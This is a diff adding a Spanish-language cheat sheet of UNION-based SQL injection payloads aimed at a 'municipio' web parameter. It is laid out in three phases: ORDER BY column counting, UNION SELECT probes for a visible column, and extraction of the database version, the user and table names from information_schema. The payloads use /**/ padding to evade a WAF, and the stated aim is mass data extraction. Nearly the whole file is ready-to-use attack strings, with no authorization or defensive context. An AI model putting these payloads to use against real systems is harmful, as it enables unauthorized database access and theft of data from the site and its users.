@@ -1,0 +1,65 @@
+PAYLOADS PARA INYECCIÓN SQL UNION-BASED (MANUAL TESTING)
+==========================================================
+
+OBJETIVO:
+Encontrar el número de columnas y la columna visible para escalar a extracción masiva.
+
+NOTA: Reemplaza "022" por el valor que estés usando en el parámetro 'municipio'.
+      Los espacios pueden necesitar ser reemplazados por "/**/" si hay WAF.
+
+----------------------------------------------------------------------------------
+FASE 1: DETERMINAR EL NÚMERO DE COLUMNAS (ORDER BY)
+Itera incrementando el número hasta que recibas un error o la página cambie drásticamente (contenido vacío).
+----------------------------------------------------------------------------------
+
+022/**/ORDER/**/BY/**/1--
+022/**/ORDER/**/BY/**/2--
+022/**/ORDER/**/BY/**/3--
+022/**/ORDER/**/BY/**/4--
+022/**/ORDER/**/BY/**/5--
+022/**/ORDER/**/BY/**/6--
+022/**/ORDER/**/BY/**/7--
+022/**/ORDER/**/BY/**/8--
+022/**/ORDER/**/BY/**/9--
+022/**/ORDER/**/BY/**/10--
+...
+022/**/ORDER/**/BY/**/15--
+...
+022/**/ORDER/**/BY/**/20--
+...
+022/**/ORDER/**/BY/**/30--
+...
+022/**/ORDER/**/BY/**/50--
+
+
+----------------------------------------------------------------------------------
+FASE 2: ENCONTRAR COLUMNA VISIBLE (UNION SELECT)
+Una vez sepas el número (ej. supongamos que son 5), usa estos payloads para ver dónde se refleja "X".
+Debes hacer que la consulta original falle o sea nula (usando -1 o AND 1=0) para que se muestren tus datos.
+----------------------------------------------------------------------------------
+
+-- Si fueran 3 columnas:
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,2,3--
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/'A','B','C'--
+
+-- Si fueran 5 columnas:
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5--
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/0x41,0x42,0x43,0x44,0x45-- (Usando HEX para evitar comillas)
+
+-- Si fueran 10 columnas:
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10--
+
+-- Si fueran 15 columnas:
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--
+
+
+----------------------------------------------------------------------------------
+FASE 3: PRUEBA DE EXTRACCIÓN (Si encontraste la columna visible, ej. la #2)
+----------------------------------------------------------------------------------
+
+-- Extraer versión y usuario en la columna 2 (suponiendo 5 columnas totales):
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,CONCAT(@@version,0x7c,user()),3,4,5--
+
+-- Listar tablas (suponiendo 5 columnas, inyectando en la 2):
+022/**/AND/**/1=0/**/UNION/**/ALL/**/SELECT/**/1,table_name,3,4,5/**/FROM/**/information_schema.tables--
+
